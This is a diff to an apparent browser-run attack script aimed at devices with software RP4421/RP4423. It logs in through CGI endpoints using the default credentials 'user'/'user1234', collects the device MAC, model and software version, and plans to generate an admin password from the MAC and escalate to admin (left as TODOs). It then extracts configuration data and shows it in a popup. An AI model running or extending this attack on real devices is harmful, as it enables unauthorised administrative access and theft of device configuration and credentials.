@@ -4,7 +4,7 @@ const SUPPORTED_SOFTWARE = ['RP4421', 'RP4423'];
 
 // EndPoints
 const EP_CHECK_LOGIN = '/cgi-bin/ajax?ajaxmethod=get_login_user';
-
+const EP_BASE_INFO = '/cgi-bin/ajax?ajaxmethod=get_base_info'
 
 // ===== Utils =====
 async function loadJS(url) {
@@ -229,9 +229,11 @@ function showPopup(data) {
 
 // ===== ENTRY POINT =====
 // Init vars
-let deviceModel;
-let deviceMac;
-let deviceSoftware;
+let DeviceBaseInfo = {
+    model: '',
+    software: '',
+    mac: '',
+}
 
 const extractedData = {
     "Device Info": [],
@@ -242,9 +244,26 @@ const extractedData = {
 await loadJS('/js/aes.js');
 
 // Phase 1: Check login and escalate to admin
-// Not logged in > login as user > get mac > generate pass > login as admin
-// logged in as user > get mac > generate pass > login as admin
-// If logged in as admin > skip to phase 2
+let loginStatus = await getJSON(EP_CHECK_LOGIN);
+
+// Not logged in > login as user
+if (!loginStatus.login_user) {
+    await login('user', 'user1234');
+    loginStatus = await getJSON(EP_CHECK_LOGIN);
+}
+
+// logged in (as user or admin) > collect DeviceBaseInfo
+const baseInfo = await getJSON(EP_BASE_INFO);
+DeviceBaseInfo.mac = baseInfo.brmac;
+DeviceBaseInfo.software = baseInfo.SoftwareVersion;
+DeviceBaseInfo.model = baseInfo.ModelName;
+
+if (loginStatus.login_user === '1') {
+    // TODO: generate admin pass from mac address
+
+    // TODO: login as admin using generated pass
+}
+// If logged in as admin (loginStatus.login_user === '2') > skip to phase 2
 
 // Phase 2: Extract data
 // Collect config
@@ -255,5 +274,5 @@ await loadJS('/js/aes.js');
 
 
 // Phase 3 present data
-printResults(extractedData);
+// printResults(extractedData);
 showPopup(extractedData);
